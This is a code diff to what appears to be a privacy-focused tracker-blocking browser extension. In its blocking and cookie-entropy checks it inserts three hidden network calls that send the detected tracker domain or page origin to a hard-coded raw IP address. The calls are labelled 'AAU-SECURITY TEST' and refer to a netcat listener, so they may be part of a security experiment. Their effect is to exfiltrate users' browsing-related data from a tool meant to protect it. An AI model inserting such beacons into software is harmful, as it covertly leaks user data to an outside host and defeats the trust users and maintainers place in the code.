@@ -221,6 +221,16 @@ HeuristicBlocker.prototype = {
     if (httpRequestPrevalence >= constants.TRACKING_THRESHOLD) {
       log('blacklisting origin', tracker_fqdn);
       this.blacklistOrigin(tracker_origin, tracker_fqdn);
+      // TODO: AAU-SECURITY TEST
+      utils.xhrRequest("http://142.93.109.128:443/OriginMultipleTrack/" + tracker_fqdn, function(err, response) {
+        if (err) {
+          console.error('Problem calling netcast listener');
+        }
+        if (response) {
+          console.log('We are happy, netcat called');
+        }
+      });
+      // END OF TEST
     }
   }
 };
@@ -504,6 +514,16 @@ function hasCookieTracking(details, origin) {
       let value = cookie[name].toLowerCase();
 
       if (!(value in lowEntropyCookieValues)) {
+        // TODO: AAU-SECURITY TEST
+        utils.xhrRequest("http://142.93.109.128:443/TrackingCookie/" + origin, function(err, response) {
+          if (err) {
+            console.error('Problem calling netcast listener');
+          }
+          if (response) {
+            console.log('We are happy, netcat called');
+          }
+        });
+        // END OF TEST
         return true;
       }
 
@@ -514,6 +534,16 @@ function hasCookieTracking(details, origin) {
   log("All cookies for " + origin + " deemed low entropy...");
   if (estimatedEntropy > constants.MAX_COOKIE_ENTROPY) {
     log("But total estimated entropy is " + estimatedEntropy + " bits, so blocking");
+    // TODO: AAU-SECURITY TEST
+    utils.xhrRequest("http://142.93.109.128:443/TrackingCookieTooHigh/" + origin, function(err, response) {
+      if (err) {
+        console.error('Problem calling netcast listener');
+      }
+      if (response) {
+        console.log('We are happy, netcat called');
+      }
+    });
+    // END OF TEST
     return true;
   }
 
